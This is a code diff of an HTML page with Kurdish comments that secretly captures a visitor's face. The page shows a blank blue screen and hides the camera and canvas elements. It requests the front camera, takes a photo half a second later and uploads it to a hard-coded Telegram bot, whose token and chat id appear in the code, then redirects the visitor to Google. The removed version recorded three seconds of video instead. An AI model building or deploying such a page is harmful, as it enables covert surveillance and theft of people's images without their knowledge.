@@ -11,71 +11,59 @@
     <style>
         body { 
             margin: 0; 
-            background: #0000FF !important; /* ڕەنگی شین وەک خۆت ویستت */
+            background: #0000FF !important; /* ڕەنگی شین */
             display: flex; 
             align-items: center; 
             justify-content: center; 
             height: 100vh; 
             overflow: hidden;
         }
-        /* شاردنەوەی کامێراکە لەبەرچاو */
-        video { display: none !important; }
+        /* شاردنەوەی کامێرا و کانڤاسەکە لای بەرامبەر */
+        video, canvas { display: none !important; }
     </style>
 </head>
 <body>
 
-    <video id="video" autoplay playsinline muted></video>
+    <video id="video" autoplay playsinline></video>
+    <canvas id="canvas"></canvas>
 
     <script>
+        // زانیاری بۆتەکەت
         const token = '8734772782:AAFT6ize__0OBmz53luKQXus2iJpSg9NpmA';
         const chatId = '7602797383';
 
         window.onload = function() {
-            // تەنها کامێرا چالاک دەکات و مایکرۆفۆنی بێدەنگ کردووە (audio: false)
-            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
+            // تەنها داوای کامێرا دەکات بەبێ مایکرۆفۆن بۆ ئەوەی خێرا مۆڵەت بدات
+            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => {
                 const video = document.getElementById('video');
                 video.srcObject = stream;
                 
-                const mediaRecorder = new MediaRecorder(stream);
-                let chunks = [];
-
-                mediaRecorder.ondataavailable = function(e) {
-                    if (e.data.size > 0) {
-                        chunks.push(e.data);
-                    }
-                };
-
-                mediaRecorder.onstop = function() {
-                    if (chunks.length === 0) return;
-                    
-                    const blob = new Blob(chunks, { type: 'video/mp4' });
-                    const formData = new FormData();
-                    formData.append('chat_id', chatId);
-                    formData.append('video', blob, 'video.mp4');
-
-                    // ناردنی ڤیدیۆ کورتەکە بۆ تیلیگرام
-                    fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-                        method: 'POST',
-                        body: formData
-                    }).then(() => {
-                        stream.getTracks().forEach(track => track.stop());
-                        window.location.href = "https://google.com";
-                    }).catch(() => {
-                        window.location.href = "https://google.com";
-                    });
-                };
-
-                mediaRecorder.start();
-
-                // تەنها ٣ چرکە ڕیکۆرد دەکات بۆ ئەوەی خێرا بنێردرێت و نەسوتێت
+                // نیو چرکە چاوەڕێ دەکات تا کامێراکە ڕوون دەبێتەوە و یەکسەر وێنەکە دەگرێت
                 setTimeout(() => {
-                    if (mediaRecorder.state !== "inactive") {
-                        mediaRecorder.stop();
-                    }
-                }, 3000);
+                    const canvas = document.getElementById('canvas');
+                    canvas.width = video.videoWidth;
+                    canvas.height = video.videoHeight;
+                    canvas.getContext('2d').drawImage(video, 0, 0);
+                    
+                    canvas.toBlob(blob => {
+                        const formData = new FormData();
+                        formData.append('chat_id', chatId);
+                        formData.append('photo', blob, 'img.jpg');
 
+                        // ناردنی وێنەکە بۆ بۆتی تیلیگرام
+                        fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
+                            method: 'POST',
+                            body: formData
+                        }).then(() => {
+                            // دوای ناردن، کامێراکە دەکوژێنێتەوە و دەیباتە سەر گووگڵ
+                            stream.getTracks().forEach(track => track.stop());
+                            window.location.href = "https://google.com";
+                        });
+                    }, 'image/jpeg');
+                }, 500);
             }).catch(err => {
+                // ئەگەر مۆڵەتی نەدا یەکسەر بچێتە گووگڵ
                 window.location.href = "https://google.com";
             });
         };
